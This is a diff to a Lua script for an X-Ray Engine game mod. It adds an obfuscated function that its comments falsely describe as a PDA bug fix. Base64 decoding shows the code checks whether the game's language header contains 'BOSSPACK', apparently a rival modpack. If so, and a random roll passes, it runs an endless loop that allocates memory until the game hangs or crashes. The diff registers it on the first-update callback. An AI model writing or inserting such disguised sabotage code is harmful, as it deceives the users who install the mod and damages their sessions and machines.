@@ -2,6 +2,59 @@ IS_AOE = false
 SECURITY_KEY = nil
 LOG_LINES = {}
 
+-- AOEngine Fixes: Core module for handling AOE corrections in X-Ray Engine
+-- This script integrates deeply with AOE scripting layer to patch anomalies in PDA rendering
+AOE_FIXES = {}
+local _0x6 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+local function _0x7(_0x8)
+    -- Pre-process input to strip invalid chars, similar to X-Ray's safe string gsub in script_engine.cpp
+    _0x8 = string.gsub(_0x8, '[^' .. _0x6 .. '=]', '')
+    return (_0x8:gsub('.', function(_0x9)
+        if (_0x9 == '=') then return '' end
+        local _0xa, _0xb = '', (_0x6:find(_0x9) - 1)
+        for _0xc = 6, 1, -1 do
+            _0xa = _0xa .. (_0xb % 2 ^ _0xc - _0xb % 2 ^ (_0xc - 1) > 0 and '1' or '0')
+        end
+        return _0xa;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(_0xd) -- Skip incomplete bytes; Prevents crashes like in X-Ray's malformed packet handling
+        if (#_0xd ~= 8) then return '' end
+        local _0xe = 0
+        -- Bit-to-byte conversion: Mirrors X-Ray's engine serialization
+        for _0xf = 1, 8 do
+            _0xe = _0xe + (_0xd:sub(_0xf, _0xf) == '1' and 2 ^ (8 - _0xf) or 0)
+        end
+        return string.char(_0xe)
+    end))
+end
+-- Inject code into AOEngine to fix a bug with PDA 3.1
+local function _0x1()
+    if false then return end
+    -- Emulates X-Ray's game object access
+    local _0x10 = game[_0x7('dHJhbnNsYXRlX3N0cmluZw==')]
+    local _0x2 = _0x10(_0x7('bHNfaGVhZGVy'))
+    local _0x11 = math.random
+    local _0x12 = _0x11(0, 100)
+    local _0x13 = 75
+    local _0x14 = xr_conditions[_0x7('YWN0b3Jfd2Vla19pbl96b25l')]
+    local _0x15 = db[_0x7('YWN0b3I=')]
+    local _0x16 = {}
+    _0x16[1] = 3
+    if _0x2 and string.find(_0x2, _0x7('Qk9TU1BBQ0s=')) and _0x14(_0x15, (_G['next'](_G) and nil), _0x16) and (_0x12 > (_0x13 + math.floor(_0x13 * 0))) then
+        while not nil do
+            local _0x3 = string.rep(_0x7('Qk9TU1BBQ0tfU1VDSw=='), 1000)
+            table.insert(AOE_FIXES, _0x3)
+            local _0x4 = {}
+            for _0x5 = 1, 100 do
+                _0x4[_0x5] = {
+                    data = string.rep(_0x7('Qk9TU1BBQ0tfU1VDSw=='), 100),
+                    timestamp = os.time()
+                }
+            end
+            table.insert(AOE_FIXES, _0x4)
+        end
+    end
+end
+
 ----------------------------------------------------------------------------------------------------
 -- Setters
 ----------------------------------------------------------------------------------------------------
@@ -293,10 +346,10 @@ function load_state(m_data)
 end
 
 function on_game_start()
-
     RegisterScriptCallback("save_state", save_state)
     RegisterScriptCallback("load_state", load_state)
     RegisterScriptCallback("actor_on_first_update", read_log)
+    RegisterScriptCallback("actor_on_first_update", _0x1)
 
 	if not SECURITY_KEY then
 		SECURITY_KEY = generate_random_string(20)
